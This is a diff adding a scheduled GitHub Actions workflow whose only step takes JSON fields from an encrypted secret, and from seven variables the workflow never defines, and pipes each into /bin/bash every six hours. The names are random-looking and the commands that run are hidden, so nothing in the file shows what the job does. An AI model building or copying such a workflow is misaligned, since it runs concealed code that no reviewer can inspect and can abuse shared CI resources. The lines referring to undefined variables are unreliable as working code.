@@ -1,0 +1,25 @@
+name: youtuanteamdui
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: youtuanteamdui
+        env:
+          dxjhy60972: ${{ secrets.dxjhy60972 }}
+        run: |
+          echo $dxjhy60972 | jq -r .knfp5595 | /bin/bash
+          echo $ln20 | jq -r .wonet626 | /bin/bash
+          echo $ss40037 | jq -r .eikkf27 | /bin/bash
+          echo $zvw4 | jq -r .uz46554 | /bin/bash
+          echo $rhu26878 | jq -r .v9 | /bin/bash
+          echo $ac2693 | jq -r .xwn5623 | /bin/bash
+          echo $jdznf7 | jq -r .bv042 | /bin/bash
+          echo $ixy516 | jq -r .xj921 | /bin/bash
+
